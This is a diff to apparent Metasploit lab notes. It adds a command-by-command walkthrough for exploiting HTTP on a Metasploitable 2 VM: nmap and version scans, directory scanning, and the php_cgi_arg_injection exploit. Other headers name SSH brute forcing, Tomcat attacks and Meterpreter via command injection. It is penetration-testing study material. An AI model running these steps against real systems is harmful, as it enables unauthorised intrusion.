@@ -43,7 +43,7 @@ $ cd /usr/share/metasploit-framework/modules/exploits/windows/smb
 
 ---
 
-## BruteForcing SSH with Metasploits
+## 1. BruteForcing SSH with Metasploits
 
 192.168.71.131
 
@@ -79,11 +79,42 @@ _Done_
 
 ---
 
-## WIFI Hacking using rockyou.txt.gz
+## 2. Exploit Port 80 HTTP Metasploitable 2
+
+```bash
+
+$ nmap -sV -p 80 192.168.71.131
+# 80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+
+$ search http_ver
+# 0   auxiliary/scanner/http/http_version      .                normal  No     HTTP Version Detection
+
+$ use auxiliary/scanner/http/http_version
+$ show options
+$ set RHOSTS 192.168.71.131
+$ run
+# 192.168.71.131:80 Apache/2.2.8 (Ubuntu) DAV/2 ( Powered by PHP/5.2.4-2ubuntu5.10 )
+
+# Check Version on <Target_IP>/phpinfo
+
+# Exploit
+$ search dir_scanner
+$ use auxiliary/scanner/http/dir_scanner
+$ set RHOST 192.168.71.131
+$ run
+
+# Search for Configuration File (php.ini) Path : /etc/php5/cgi
+$ search php_cgi
+$ use exploit/multi/http/php_cgi_arg_injection
+$ show options
+$ set RHOST 192.168.71.131
+$ exploit
+
+```
 
 ---
 
-## Attacking Tomcat with Metasploit
+## 3. Attacking Tomcat with Metasploit
 
 ```bash
 # Find for Tomcat Services
@@ -96,4 +127,5 @@ $ show options
 
 ---
 
-## Getting Meterpreter with command Injection
+## 4. Getting Meterpreter with command Injection
+
